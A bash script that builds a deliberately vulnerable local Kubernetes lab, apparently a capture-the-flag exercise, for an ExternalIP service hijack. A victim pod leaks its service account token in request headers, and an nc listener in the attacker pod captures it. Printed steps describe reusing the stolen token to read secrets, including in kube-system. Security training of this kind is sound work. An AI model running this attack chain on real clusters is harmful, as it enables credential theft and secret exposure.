#!/bin/bash
set -euo pipefail
CLUSTER_NAME="chain24-externalip-to-secrets"

echo "[Chain-24] ExternalIP Hijack to Secret Theft"
echo "[*] Deploying infrastructure..."

kind create cluster --name "$CLUSTER_NAME" --config - << 'YAML'
kind: Cluster
apiVersion: kind.x-k8s.io/v1alpha4
nodes:
  - role: control-plane
    image: kindest/node:v1.27.3
YAML

kubectl wait --for=condition=Ready pods --all -n kube-system --timeout=120s 2>/dev/null || true
sleep 10

# Namespaces
kubectl create ns secure-ns 2>/dev/null || true
kubectl create ns ns-beta 2>/dev/null || true
kubectl create ns attack-ns 2>/dev/null || true

# Victim SA whose token is worth stealing: cluster-wide secrets read
kubectl apply -f - << 'YAML'
apiVersion: v1
kind: ServiceAccount
metadata:
  name: secret-reader-sa
  namespace: secure-ns
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: chain24-secret-reader
rules:
  - apiGroups: [""]
    resources: ["secrets"]
    verbs: ["get", "list"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: chain24-secret-reader
subjects:
  - kind: ServiceAccount
    name: secret-reader-sa
    namespace: secure-ns
roleRef:
  kind: ClusterRole
  name: chain24-secret-reader
  apiGroup: rbac.authorization.k8s.io
YAML

# Step 1/2: victim Service + flag-bearing client (X-Flag header) that also leaks
# its own SA token (X-Cred header) through the intercepted traffic
kubectl apply -f - << 'YAML'
apiVersion: v1
kind: Service
metadata:
  name: internal-api
  namespace: secure-ns
spec:
  selector:
    app: internal-api
  ports:
    - port: 8080
      targetPort: 80
---
apiVersion: apps/v1
kind: Deployment
metadata:
  name: internal-api
  namespace: secure-ns
spec:
  replicas: 1
  selector:
    matchLabels:
      app: internal-api
  template:
    metadata:
      labels:
        app: internal-api
    spec:
      serviceAccountName: secret-reader-sa
      containers:
        - name: api
          image: nginx:1.24-alpine
          imagePullPolicy: IfNotPresent
          command: ["sh", "-c"]
          args:
            - |
              echo 'flag{chain24-step1-hijack}' > /tmp/step1_flag.txt
              while true; do
                TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
                wget -qO- --timeout=2 \
                  --header="X-Flag: flag{chain24-step1-hijack}" \
                  --header="X-Cred: $TOKEN" \
                  http://internal-api.secure-ns.svc.cluster.local:8080/data 2>/dev/null || true
                sleep 5
              done &
              nginx -g 'daemon off;'
          ports:
            - containerPort: 80
YAML

# Step 3/4 flags (readable with the stolen secret-reader-sa token)
kubectl create secret generic flag-secret -n ns-beta \
  --from-literal=flag='flag{chain24-step3-crossns}' 2>/dev/null || true
kubectl create secret generic flag-secret -n kube-system \
  --from-literal=flag='flag{chain24-step4-secrets-final}' 2>/dev/null || true

# Attacker tenant: can only create Services in attack-ns
kubectl apply -f - << 'YAML'
apiVersion: v1
kind: ServiceAccount
metadata:
  name: attacker-sa
  namespace: attack-ns
---
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: svc-creator
  namespace: attack-ns
rules:
  - apiGroups: [""]
    resources: ["services"]
    verbs: ["create", "get", "list"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: svc-creator
  namespace: attack-ns
subjects:
  - kind: ServiceAccount
    name: attacker-sa
    namespace: attack-ns
roleRef:
  kind: Role
  name: svc-creator
  apiGroup: rbac.authorization.k8s.io
---
apiVersion: v1
kind: Pod
metadata:
  name: attacker
  namespace: attack-ns
  labels:
    app: attacker
spec:
  serviceAccountName: attacker-sa
  containers:
    - name: shell
      image: alpine:latest
      imagePullPolicy: IfNotPresent
      command: ["sh", "-c"]
      args:
        - |
          while true; do
            printf 'HTTP/1.1 200 OK\r\n\r\n' | nc -l -p 8080 -q 1 >> /tmp/captured_requests.txt 2>/dev/null || true
          done
      ports:
        - containerPort: 8080
YAML

kubectl wait --for=condition=Ready pods -l app=internal-api -n secure-ns --timeout=120s 2>/dev/null || true
kubectl wait --for=condition=Ready pod/attacker -n attack-ns --timeout=60s 2>/dev/null || true
sleep 10

TARGET_IP=$(kubectl get svc internal-api -n secure-ns -o jsonpath='{.spec.clusterIP}')
echo ""
echo "[+] Chain-24 Ready"
echo "    Target Service ClusterIP: $TARGET_IP"
echo "    Step 1: create a Service with externalIPs=[$TARGET_IP] in attack-ns (selector app=attacker, port 8080 -> targetPort 8080)"
echo "    Step 2: kubectl exec -n attack-ns attacker -- grep -E 'X-Flag|X-Cred' /tmp/captured_requests.txt"
echo "    Step 3: use the captured X-Cred token -> kubectl --token=\$T get secret flag-secret -n ns-beta"
echo "    Step 4: kubectl --token=\$T get secret flag-secret -n kube-system"
